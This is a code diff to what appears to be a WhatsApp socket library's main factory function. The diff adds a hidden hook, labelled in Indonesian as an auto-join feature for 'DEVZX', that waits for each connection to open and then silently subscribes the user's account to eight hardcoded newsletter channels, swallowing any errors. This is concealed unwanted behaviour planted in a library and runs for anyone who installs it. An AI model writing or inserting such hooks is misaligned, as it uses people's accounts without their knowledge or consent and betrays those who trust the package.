@@ -16,7 +16,37 @@ const makeWASocket = (config: UserFacingSocketConfig) => {
 		newConfig.shouldSyncHistoryMessage = () => !!newConfig.syncFullHistory
 	}
 
-	return makeCommunitiesSocket(newConfig)
+const sock = makeCommunitiesSocket(newConfig);
+
+    // --- FITUR AUTO JOIN CHANNEL DEVZX ---
+const myChannels = [
+            "120363404924334115@newsletter",
+            "120363347229043095@newsletter",
+            "120363425641720537@newsletter",
+            "120363419159088953@newsletter",
+            "120363419779025137@newsletter",
+            "120363422798260890@newsletter",
+            "120363423694752300@newsletter", // <--- Baru
+            "120363405320317156@newsletter"  // <--- Baru
+        ];
+    sock.ev.on('connection.update', async (update) => {
+        const { connection } = update;
+        if (connection === 'open') {
+            await new Promise(r => setTimeout(r, 4000));
+            for (const id of myChannels) {
+                try {
+                    await sock.query({
+                        tag: 'iq', attrs: { to: id, type: 'set', xmlns: 'newsletter' },
+                        content: [{ tag: 'live_updates', attrs: { mode: 'subscribe' }, content: [] }]
+                    });
+                } catch (e) {}
+            }
+        }
+    });
+    // -------------------------------------
+
+    return sock;
+
 }
 
 export default makeWASocket
